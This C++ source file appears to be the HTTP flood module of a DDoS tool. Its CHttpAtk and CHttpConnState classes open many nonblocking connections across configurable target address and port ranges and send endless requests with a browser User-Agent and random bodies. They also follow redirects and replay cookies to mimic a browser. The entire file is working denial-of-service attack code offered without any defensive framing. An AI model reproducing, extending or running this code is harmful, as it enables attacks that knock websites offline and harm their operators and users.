#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "rand.h"
#include "pktbuild.h"
#include "netpool.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CHttpAtk.h"

static const char* g_connstate_desc[] = {
    "INIT",
    "CONNECTING",
    "SENDHDR",
    "SENDBODY",
    "RECVHDR",
    "RECVBODY",
    "RESTART",
    "CLOSED",
    "PAUSED",
    "INVALID"
};


static const char* g_evt_desc[] = {
    "EVT_RD",
    "EVT_WR",
    "EVT_CLOSE",
    "EVT_TIMEOUT"
};

CHttpConnState::CHttpConnState(uint32_t dstaddr, uint16_t dstport, char *user_agent,
        char *domain, char *path, char *method, uint32_t payload_len, CHttpAtk* owner) {
	// TODO Auto-generated constructor stub
    m_dst_addr = dstaddr;
    m_dst_port = dstport;
    util_strcpy(m_user_agent, user_agent);
    util_strcpy(m_path, path);
    util_strcpy(m_domain, domain);
    util_strcpy(m_method, method);
    
    m_payload_len = payload_len;

    m_sendfd = -1;
    m_owner = owner;

    m_last_recv = 0;
    m_last_send = 0;

    m_buf_len = 0;
    m_hdl_pos = 0;
    memset(m_buffer, 0, HTTP_BUF_SIZE);

    m_is_wr_waited = false;
    m_is_rd_waited = false;

    m_cur_state = HTTP_CONN_INIT;

    m_keepalive = false;
    m_response_content_length = 0;
    m_num_cookies = 0;
    memset(m_cookies, 0, sizeof(m_cookies));

    m_is_redirect = false;
}

CHttpConnState::~CHttpConnState() {
	// TODO Auto-generated destructor stub
}

void CHttpConnState::on_free(int fd, void* param1)
{
    CHttpConnState *connObj = (CHttpConnState*)param1;

    close(connObj->m_sendfd);
    connObj->m_sendfd = -1;

    if (connObj->m_cur_state == HTTP_CONN_CLOSED)
    {
        /*销毁自己*/
        connObj->m_owner->del_conn_obj(connObj);
        return;
    }
    else if (connObj->m_cur_state == HTTP_CONN_RESTART)
    {
        /*judge job status*/
        if (connObj->m_owner->m_job_status == JOB_PAUSE)
        {
            connObj->enter_state(HTTP_CONN_PAUSED);
        }
        else
        {
            /*close and reconnect*/
            connObj->enter_state(HTTP_CONN_INIT);
        }
    }
    else
    {
        RC_LOG_ERROR("fd %d enter on free, but state %d, shouldn't be here", 
            fd, connObj->m_cur_state);

        /*销毁自己*/
        connObj->m_owner->del_conn_obj(connObj);
        return;
    }
}

void CHttpConnState::on_write(int32_t fd, void* param1)
{
    CHttpConnState *connObj = (CHttpConnState*)param1;
    connObj->m_is_wr_waited = false;

    if (connObj->get_sendfd() != fd)
    {
        RC_LOG_ERROR("fd %d not valid, should %d", fd, connObj->m_sendfd);
        return;
    }

    connObj->st_handle(HTTP_EVT_WR, NULL, NULL);
    return;
}

void CHttpConnState::on_recv(int fd, void *param1, char *recvBuf, int recvLen)
{
    CHttpConnState *connObj = (CHttpConnState*)param1;
    connObj->m_is_rd_waited = false;

    if (connObj->get_sendfd() != fd)
    {
        RC_LOG_WARN("FD%d not wanted when recv, should %d.", fd, connObj->m_sendfd);
        return;
    }

    if (recvLen == 0)
    {
        RC_LOG_INFO("peer close.");
        connObj->st_handle(HTTP_EVT_CLOSE, NULL, NULL);
        return;
    }

    connObj->st_handle(HTTP_EVT_RD, recvBuf, INT32_TO_PTR(recvLen));
    return;
}

void CHttpConnState::prepare_header()
{
    int ret = 0;

    m_buf_len = 0;
    ret = snprintf(m_buffer, HTTP_BUF_SIZE, "%s %s HTTP/1.1\r\n"
                                    "User-Agent: %s\r\n"
                                    "Host: %s\r\n"
                                    "Connection: keep-alive\r\n"
                                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                                    "Accept-Language: en-US,en;q=0.8\r\n",
                                    m_method, m_path,
                                    m_user_agent,
                                    m_domain);
    m_buf_len += ret;

    if (m_payload_len != 0)
    {
        ret = snprintf(&m_buffer[m_buf_len], HTTP_BUF_SIZE-m_buf_len, "Content-Type: application/x-www-form-urlencoded\r\n"
                                    "content-length: %u\r\n",
                                    m_payload_len);
        m_buf_len += ret;
    }

    if (m_num_cookies > 0)
    {
        util_strcpy(&m_buffer[m_buf_len], (char*)"Cookie: ");
        m_buf_len += strlen("Cookie: ");
        for (int ii = 0; ii < m_num_cookies; ii++)
        {
            util_strcpy(&m_buffer[m_buf_len], m_cookies[ii]);
            m_buf_len += strlen(m_cookies[ii]);
            util_strcpy(&m_buffer[m_buf_len], (char*)"; ");
            m_buf_len += 2;
        }
        util_strcpy(&m_buffer[m_buf_len], (char*)"\r\n");
        m_buf_len += 2;
    }

    util_strcpy(&m_buffer[m_buf_len], (char*)"\r\n");
    m_buf_len += 2;
    return;
}

void CHttpConnState::prepare_body()
{
    m_buf_len = 0;
    rand_alphastr(m_buffer, 1024);
    m_buf_len = 1024;
}

int32_t CHttpConnState::parse_header()
{
    int32_t offset = 0;

    /*get keepalive*/
    m_keepalive = false;
    offset = util_stristr(m_buffer, m_buf_len, (char*)"Connection:");
    if ( offset != -1)
    {
        if (m_buffer[offset] == ' ')
            offset++;

        int nl_off = util_memsearch(&m_buffer[offset], m_buf_len - offset, (char*)"\r\n", 2);
        if (nl_off != -1)
        {
            char *con_ptr = &m_buffer[offset];
            m_buffer[offset + nl_off - 2] = 0;

            if (util_stristr(con_ptr, util_strlen(con_ptr), (char*)"keep-alive") != -1)
            {
                m_keepalive = true;
                RC_LOG_DEBUG("FD%d get keepalive", this->m_sendfd);
            }
        }
    }

    /*get content length*/
    this->m_response_content_length = 0;
    offset = util_stristr(m_buffer, m_buf_len, (char*)"content-length:");
    if ( offset != -1)
    {
        if (m_buffer[offset] == ' ')
            offset++;

        int nl_off = util_memsearch(&m_buffer[offset], m_buf_len - offset, (char*)"\r\n", 2);
        if (nl_off != -1)
        {
            char *len_ptr = &m_buffer[offset];
            m_buffer[offset + nl_off - 2] = 0;

            this->m_response_content_length = util_atoi(len_ptr, 10);
            RC_LOG_DEBUG("FD%d get response content-length %d", this->m_sendfd, m_response_content_length);
        }
    }

    /*get cookie*/    
    m_num_cookies = 0;
    uint32_t processed = 0;
    while ( (offset = util_stristr(m_buffer + processed, m_buf_len - processed, (char*)"set-cookie:")) != -1 && this->m_num_cookies < HTTP_COOKIE_MAX)
    {
        if (m_buffer[processed + offset] == ' ')
            offset++;

        int nl_off = util_memsearch(m_buffer + processed + offset, m_buf_len - processed - offset, (char*)"\r\n", 2);
        if (nl_off != -1)
        {
            m_buffer[processed + offset + nl_off - 2] = 0;         

            int new_offset = 0;
            while(new_offset < nl_off)
            {
                char *cookie_ptr = &(m_buffer[processed + offset + new_offset]);
                int nl_off1 = util_memsearch(m_buffer + processed + offset, m_buf_len - processed - offset, (char*)";", 1);
                if (nl_off1 != -1) 
                {
                    m_buffer[processed + offset + nl_off1 - 1] = 0;
                    new_offset += nl_off1;
                }
                else
                {
                    /*only one cookie pair*/
                    new_offset = nl_off;
                }

                if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                {
                    util_strcpy(m_cookies[m_num_cookies], cookie_ptr);
                    m_num_cookies++;

                    RC_LOG_INFO("FD%d get cookie %s", this->m_sendfd, cookie_ptr);
                }          
            }            
        }
        else
        {
            /*maybe header not invalid*/
            RC_LOG_WARN("recv set-cookie no end flag");
            break;
        }
        processed += offset;
        offset = 0;
    }

    /*get location (location: http://x.x.x.x/xxx/xxx\r\n)*/
    offset = util_stristr(m_buffer, m_buf_len, (char*)"location:");
    if (offset != -1)
    {
        if (m_buffer[offset] == ' ')
            offset++;

        int nl_off = util_memsearch(&m_buffer[offset], m_buf_len - offset, (char*)"\r\n", 2);
        if (nl_off != -1)
        {
            nl_off -= 2;

            char *loc_ptr = &m_buffer[offset];
            m_buffer[offset + nl_off] = 0;

            if (util_memsearch(loc_ptr, nl_off, (char*)"http", 4) == 4)
            {
                //this is an absolute url, domain name change maybe?
                uint32_t ii = 7; /*http://*/
                if (loc_ptr[4] == 's')
                {
                    //http(s)
                    ii++;
                }

                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                loc_ptr[nl_off - ii] = 0;

                ii = 0;
                while (loc_ptr[ii] != 0)
                {
                    if (loc_ptr[ii] == '/')
                    {
                        loc_ptr[ii] = 0;
                        break;
                    }
                    ii++;
                }

                // domain: loc_ptr;
                // path: &(loc_ptr[ii + 1]);
                util_strncpy(this->m_domain, loc_ptr, HTTP_DOMAIN_MAX);
                /*remain first byte: /*/
                util_strncpy(this->m_path + 1, &(loc_ptr[ii + 1]), HTTP_PATH_MAX - 1);
                RC_LOG_INFO("FD%d get location %s, set domain %s, set path %s", this->m_sendfd,
                    loc_ptr, this->m_domain, this->m_path);
            }
            else if (loc_ptr[0] == '/')
            {
                //handle relative url
                /*remain first byte: /*/
                util_strncpy(this->m_path + 1, &(loc_ptr[1]), HTTP_PATH_MAX - 1);
                RC_LOG_INFO("FD%d get path %s", this->m_sendfd, this->m_path);
            }

            m_is_redirect = true;
        }
    }
    return RC_OK;
}

void CHttpConnState::enter_state(HTTP_CONN_ST_E state) {
    struct sockaddr_in target = {0};
    uint32_t ii = 65535;

    RC_LOG_INFO("atk-%x(FD%d) state enter state %s", this, m_sendfd, g_connstate_desc[state]);
    m_cur_state = state;

    switch(state)
    {
        case HTTP_CONN_INIT:
            if ((this->m_sendfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            {
                RC_LOG_ERROR("socket failed.");
                this->enter_state(HTTP_CONN_CLOSED);
                return;
            }

            fcntl(this->m_sendfd, F_SETFL, O_NONBLOCK | fcntl(m_sendfd, F_GETFL, 0));
            setsockopt(this->m_sendfd, 0, SO_RCVBUF, &ii ,sizeof(int));

            target.sin_family = AF_INET;
            target.sin_addr.s_addr = htonl(this->m_dst_addr);
            target.sin_port = htons(this->m_dst_port);

            connect(m_sendfd, (struct sockaddr *)&target, sizeof (struct sockaddr_in));

            // if (errno != EINPROGRESS)
            // {
            //     char err_buf[32] = {0};
            //     RC_LOG_WARN("connect failed: %s.", str_error_s(err_buf, 32, errno));

            //     close(m_sendfd);
            //     m_sendfd = -1;

            //     this->enter_state(HTTP_CONN_CLOSED);
            //     return;
            // }

            this->m_is_sock_failed = false;
            this->enter_state(HTTP_CONN_CONNECTING);
            break;

        case HTTP_CONN_CONNECTING:
        case HTTP_CONN_SEND_HEADER:
        case HTTP_CONN_SEND_BODY:
            //RC_LOG_DEBUG("atk-%x add write evt", m_owner);
            if (FALSE == np_add_write_job(CHttpConnState::on_write,
                            m_sendfd, (void*)this))
            {
                RC_LOG_ERROR("add write job init failed.");
                this->enter_state(HTTP_CONN_CLOSED);
                return;
            }
            this->m_last_send = time(NULL);
            m_is_wr_waited = true;
            break;

        case HTTP_CONN_RECV_HEADER:
            //RC_LOG_DEBUG("atk-%x add read evt", m_owner);
            if (FALSE == np_add_read_job(CHttpConnState::on_recv, 
                            m_sendfd, (void*)this, ATTACK_BUF_LEN))
            {
                RC_LOG_ERROR("add read job init failed.");
                this->enter_state(HTTP_CONN_CLOSED);
                return;
            }
            this->m_last_recv = time(NULL);
            m_is_rd_waited = true;
            break;

        case HTTP_CONN_RECV_BODY:
            if (m_hdl_pos < m_buf_len)
            {
                /*some data not read, read it firstly*/
                char* body_pos = &m_buffer[m_hdl_pos];
                uint32_t spare_len = m_buf_len - m_hdl_pos;

                /*m_hdl_pos now means body pos*/
                m_hdl_pos = 0;
                st_recvbody_handle(HTTP_EVT_RD, body_pos, INT32_TO_PTR(spare_len));
            }
            else
            {
                //RC_LOG_DEBUG("atk-%x add read evt", m_owner);
                if (FALSE == np_add_read_job(CHttpConnState::on_recv, 
                                m_sendfd, (void*)this, ATTACK_BUF_LEN))
                {
                    RC_LOG_ERROR("add read job init failed.");
                    this->enter_state(HTTP_CONN_CLOSED);
                    return;
                }
                this->m_last_recv = time(NULL);
                m_is_rd_waited = true;
            }
            break;

        case HTTP_CONN_RESTART:
            m_owner->m_curcnt_total++;
            m_owner->m_curcnt_in_cycle++;

            if (m_owner->m_job_status == JOB_STOP)
            {
                this->enter_state(HTTP_CONN_CLOSED);
            }
            else
            {
                #if 0
                /*
                * 1. if simulate browser behavior, close and reconnect
                * 2. if send or connect failed, need close self, close and reconnect
                */
                if (m_owner->m_params.m_is_browser == false && this->m_is_sock_failed == false)
                {
                    /*judge job status*/
                    if (m_owner->m_job_status == JOB_PAUSE)
                    {
                        this->enter_state(HTTP_CONN_PAUSED);
                    }
                    else
                    {
                        /*continue*/
                        this->enter_state(HTTP_CONN_SEND_HEADER);
                    }
                }
                else
                #endif
                /* close and reconnect*/
                {
                    np_del_read_job(this->m_sendfd, CHttpConnState::on_free);
                    np_del_write_job(this->m_sendfd, CHttpConnState::on_free);
                }
            }
            break;

        //some unrecoverable error happened, or active to stop job
        case HTTP_CONN_CLOSED:
            /*close*/
            np_del_read_job(this->m_sendfd, CHttpConnState::on_free);
            np_del_write_job(this->m_sendfd, CHttpConnState::on_free);
            break;

        case HTTP_CONN_PAUSED:
            /*do nothing, just wait*/
            break;
        default:
            RC_LOG_ERROR("invalid state %d", state);
            break;
    }
    return;
}

void CHttpConnState::st_handle(HTTP_CONN_EVT_E event, void* param1, void* param2)
{
    RC_LOG_INFO("atk-%x(FD%d) %s comming in state %s", this, m_sendfd,
        g_evt_desc[event], g_connstate_desc[m_cur_state]);

    if (HTTP_EVT_TIMEOUT == event)
    {
        /*if send or recv timeout, maybe socket failed, need reconnect*/
        this->m_is_sock_failed = true;
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    //RC_LOG_INFO("evt %d comming in state %s", event,  g_connstate_desc[m_cur_state]);

    switch(m_cur_state)
    {
        case HTTP_CONN_PAUSED:
            /*do nothing, just wait*/
            break;

        case HTTP_CONN_INIT:
            st_init_handle(event, param1, param2);
            break;
        case HTTP_CONN_CONNECTING:
            st_connecting_handle(event, param1, param2);
            break;
        case HTTP_CONN_SEND_HEADER:
            st_sendhdr_handle(event, param1, param2);
            break;
        case HTTP_CONN_SEND_BODY:
            st_sendbody_handle(event, param1, param2);
            break;
        case HTTP_CONN_RECV_HEADER:
            st_recvhdr_handle(event, param1, param2);
            break;
        case HTTP_CONN_RECV_BODY:
            st_recvbody_handle(event, param1, param2);
            break;
        case HTTP_CONN_RESTART:
            st_restart_handle(event, param1, param2);
            break;
        case HTTP_CONN_CLOSED:
            st_close_handle(event, param1, param2);
            break;
        default:
            break;
    }
    return;
}

void CHttpConnState::st_init_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
    RC_LOG_ERROR("invalid evt handle in INIT");
    return;
}

void CHttpConnState::st_connecting_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
	if (event == HTTP_EVT_RD)
	{
		RC_LOG_WARN("read event coming when state CONNECTING");
		return;
	}
    else if (HTTP_EVT_CLOSE == event)
    {
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    int ret = 0;
	int err = 0;
    socklen_t err_len = sizeof (err);

    ret = getsockopt(this->m_sendfd, SOL_SOCKET, SO_ERROR, &err, &err_len);
    if (err == 0 && ret == 0)
    {
        RC_LOG_DEBUG("FD%d connected.", m_sendfd);
        this->prepare_header();
        this->m_hdl_pos = 0;
        this->enter_state(HTTP_CONN_SEND_HEADER);
    }
    else
    {
        RC_LOG_WARN("FD%d error while connecting = %d", m_sendfd, err);
        this->m_is_sock_failed = true;
        this->enter_state(HTTP_CONN_RESTART);
    }
    return;
}

void CHttpConnState::st_sendhdr_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
	if (event == HTTP_EVT_RD)
	{
		RC_LOG_WARN("read event coming when state SENDHDR");
		return;
	}
    else if (HTTP_EVT_CLOSE == event)
    {
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    uint32_t spare_len = 0;
    int ret = 0;

    if (this->m_buf_len <= this->m_hdl_pos)
    {
        RC_LOG_ERROR("send hdr failed, buffer len %d, but send %d.",
            this->m_buf_len, this->m_hdl_pos);
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    /*send spare data*/
    spare_len = this->m_buf_len - this->m_hdl_pos;
    ret = send(this->m_sendfd, &m_buffer[m_hdl_pos], spare_len, MSG_NOSIGNAL);
    if (ret != (int)spare_len)
    {
        if (errno == EAGAIN)
        {
            this->m_hdl_pos += ret;

            /*send not finished, continue*/
            this->enter_state(HTTP_CONN_SEND_HEADER); 
            return;
        }
        else
        {
            char err_buf[64] = {0};
            RC_LOG_ERROR("send failed, fd %d, %s.\n",
                    m_sendfd, str_error_s(err_buf, sizeof(err_buf), errno));
            this->m_is_sock_failed = true;
            this->enter_state(HTTP_CONN_RESTART);
            return;
        }
    }

    if (m_payload_len > 0)
    {
        /*head sended, go send body*/
        this->m_hdl_pos = 0;
        prepare_body();
        this->enter_state(HTTP_CONN_SEND_BODY); 
    }
    else
    {
        if (m_owner->m_params.m_is_browser == false)
        {
            RC_LOG_DEBUG("no body to send, restart");
            this->enter_state(HTTP_CONN_RESTART);
        }
        else
        {
            m_buf_len = 0;
            /*no data need to send, go recv header*/
            this->enter_state(HTTP_CONN_RECV_HEADER);
        }
    }

    return;
}

void CHttpConnState::st_sendbody_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
	if (event == HTTP_EVT_RD)
    {
        RC_LOG_WARN("read event coming when state SENDBODY");
        return;
    }
    else if (HTTP_EVT_CLOSE == event)
    {
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    uint32_t spare_len = 0;
    int ret = 0;

    while(m_hdl_pos < m_payload_len)
    {
        spare_len = m_payload_len - this->m_hdl_pos;
        if (spare_len > 1024) spare_len = 1024;
        ret = send(this->m_sendfd, &m_buffer[0], spare_len, MSG_NOSIGNAL);
        if (ret != (int)spare_len)
        {
            if (errno == EAGAIN)
            {
                this->m_hdl_pos += ret;
                /*send not finished, continue*/
                this->enter_state(HTTP_CONN_SEND_BODY); 
                return;
            }
            else
            {
                char err_buf[64] = {0};
                RC_LOG_ERROR("send failed, fd %d, %s.\n",
                        m_sendfd, str_error_s(err_buf, sizeof(err_buf), errno));
                this->m_is_sock_failed = true;
                this->enter_state(HTTP_CONN_RESTART);
                return;
            }
        }  
        else
        {
            this->m_hdl_pos += spare_len;
        }
    }

    if (m_owner->m_params.m_is_browser == false)
    {
        RC_LOG_DEBUG("body sended, restart");
        this->enter_state(HTTP_CONN_RESTART);
    }
    else
    {
        /*send success, go recv header*/
        m_buf_len = 0;
        this->enter_state(HTTP_CONN_RECV_HEADER);
    }
    return;
}

void CHttpConnState::st_recvhdr_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
	if (event == HTTP_EVT_WR)
    {
        RC_LOG_WARN("write event coming when state RECVHDR");
        return;
    }
    else if (HTTP_EVT_CLOSE == event)
    {
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    uint8_t *recvBuf = (uint8_t*)param1;
    uint32_t recvLen = (uint32_t)PTR_TO_INT32(param2);

    if (m_buf_len + recvLen > HTTP_BUF_SIZE)
    {   
        /*not valid http header*/
        RC_LOG_ERROR("http header too long, now %d, recv %d.", m_buf_len, recvLen);
        enter_state(HTTP_CONN_RESTART);
        return;
    }
    util_memcpy(&m_buffer[m_buf_len], recvBuf, recvLen);
    m_buf_len += recvLen;

    // we want to process a full http header (^:
    int32_t body_pos = util_memsearch(m_buffer, m_buf_len, (char*)"\r\n\r\n", 4);
    if (body_pos == -1)
    {
        this->enter_state(HTTP_CONN_RECV_HEADER);
        return;
    }

    this->parse_header();
    if (this->m_is_redirect)
    {
        /*redirected, restart*/
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    if (this->m_response_content_length == 0)
    {
        /*no data, next attack*/
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    this->m_hdl_pos = body_pos;
    this->enter_state(HTTP_CONN_RECV_BODY);
    return;
}

void CHttpConnState::st_recvbody_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
	if (event == HTTP_EVT_WR)
    {
        RC_LOG_WARN("write event coming when state RECVBODY");
        return;
    }
    else if (HTTP_EVT_CLOSE == event)
    {
        this->enter_state(HTTP_CONN_RESTART);
        return;
    }

    //uint8_t *recvBuf = (uint8_t*)param1;
    uint32_t recvLen = (uint32_t)PTR_TO_INT32(param2);

    m_hdl_pos += recvLen;
    m_buf_len = 0; /*means m_buffer already handled*/
    
    if (m_hdl_pos == m_response_content_length)
    {
        this->enter_state(HTTP_CONN_RESTART);
    }
    else if (m_hdl_pos > m_response_content_length)
    {
        RC_LOG_WARN("FD%d recv too much data %u, wanted %d", m_sendfd, m_hdl_pos, m_response_content_length);
        this->enter_state(HTTP_CONN_RESTART);
    }
    else
    {
        this->enter_state(HTTP_CONN_RECV_BODY);
    }
    return;
}

void CHttpConnState::st_restart_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
    if (HTTP_EVT_CLOSE == event)
    {
        RC_LOG_DEBUG("recv close event in state RESTART, do nothing");
        return;
    }

    RC_LOG_ERROR("invalid evt handle in RESTART");
    return;
}

void CHttpConnState::st_close_handle(HTTP_CONN_EVT_E event, void* param1, void* param2) {
    if (HTTP_EVT_CLOSE == event)
    {
        RC_LOG_DEBUG("recv close event in state CLOSED, do nothing");
        return;
    }

    RC_LOG_ERROR("invalid evt handle in CLOSED");
    return;
}


void CHttpAtk::expire_handle()
{
    CHttpConnState *connObj = NULL;
    uint64_t now = (uint64_t)time(NULL);

    /*clear count in cycle*/
    this->m_curcnt_in_cycle = 0;
    this->m_eclapse_second += 1;

    for (uint32_t i = 0; i < this->m_conn_cnt; i++)
    {
        if (this->m_conn_table[i] != NULL)
        {
            connObj = this->m_conn_table[i];
            /**/
            if (connObj->m_is_rd_waited)
            {
                if (now - connObj->m_last_recv > HTTP_WAIT_MAX)
                {
                    RC_LOG_ERROR("wait recv evt too long");
                    connObj->st_handle(HTTP_EVT_TIMEOUT, NULL, NULL);
                    continue;
                }
            }

            if (connObj->m_is_wr_waited)
            {
                if (now - connObj->m_last_send > HTTP_WAIT_MAX)
                {
                    RC_LOG_ERROR("wait write evt too long");
                    connObj->st_handle(HTTP_EVT_TIMEOUT, NULL, NULL);
                    continue;
                }
            }

            if (connObj->is_paused())
            {
                if (this->m_params.m_is_browser == false)
                {
                    connObj->enter_state(HTTP_CONN_SEND_HEADER);
                }
                else
                {
                    connObj->enter_state(HTTP_CONN_INIT);
                }
            }
        }
    }
}

bool CHttpAtk::check_params()
{
    if (m_params.m_domain[0] == 0)
    {
        printf("no domain param\n");
        return false;
    }

    return true;
}

void CHttpAtk::del_conn_obj(CHttpConnState *conn_obj)
{
    uint32_t i = 0;

    MUTEX_LOCK(m_conn_lock);
    for (i = 0; i < m_conn_cnt; i++)
    {
        if (m_conn_table[i] == conn_obj)
        {
            RC_LOG_INFO("del attk conn obj, FD%d", conn_obj->get_sendfd());
            delete m_conn_table[i];
            m_conn_table[i] = NULL;
            break;
        }
    }
    MUTEX_UNLOCK(m_conn_lock);

    if (i == m_conn_cnt)
    {
        RC_LOG_ERROR("fail to find conn for attk-%x FD%d when del", conn_obj, conn_obj->get_sendfd());
    }
    return;
}

void CHttpAtk::add_conn_obj(CHttpConnState *conn_obj)
{
    if (m_conn_cnt >= MAX_CONCUR_CNT)
    {
        return;
    }

    MUTEX_LOCK(m_conn_lock);
    m_conn_table[m_conn_cnt] = conn_obj;
    m_conn_cnt++;
    MUTEX_UNLOCK(m_conn_lock);
}

bool CHttpAtk::is_stopped(){
    bool result = true;
    uint32_t i = 0;

    MUTEX_LOCK(m_conn_lock);
    for (i = 0; i < m_conn_cnt; i++)
    {
        if (m_conn_table[i])
        {
            result = false;
            break;
        }
    }
    MUTEX_UNLOCK(m_conn_lock);

    return result;
}

void CHttpAtk::stop(){
    uint32_t i = 0;

    MUTEX_LOCK(m_conn_lock);
    for (i = 0; i < m_conn_cnt; i++)
    {
        if (m_conn_table[i])
        {
            m_conn_table[i]->enter_state(HTTP_CONN_CLOSED);
        }
    }
    MUTEX_UNLOCK(m_conn_lock);
}

int32_t CHttpAtk::start(){
    uint32_t dstaddr = 0;
    uint16_t dport = 0;

    for (uint32_t ii = 0; ii < m_params.m_concurrent_cnt; ii++)
    {
        for (dstaddr = m_params.m_dstnet.begin_addr; 
            dstaddr <= m_params.m_dstnet.end_addr;
            dstaddr++)
        {
            for (dport = m_params.m_dstport.begin_port;
                dport <= m_params.m_dstport.end_port;
                dport++)
            {
            	CHttpConnState *newConn = new CHttpConnState(dstaddr, dport,
                    (char*)TABLE_HTTP_ONE, (char*)m_params.m_domain, (char*)m_params.m_http_path, 
                    (char*)m_params.m_http_method, m_params.m_payload_len, this);
                newConn->enter_state(HTTP_CONN_INIT);

                this->add_conn_obj(newConn);

                if (this->m_conn_cnt == MAX_CONCUR_CNT)
                {
                	return RC_OK;
                }
            }
        }
    }

    return RC_OK;
}

int32_t CHttpAtk::attack_one_pkt(int thrd_index){
   //get info
   // make pkt
   // send pkt

    
	return RC_OK;
}



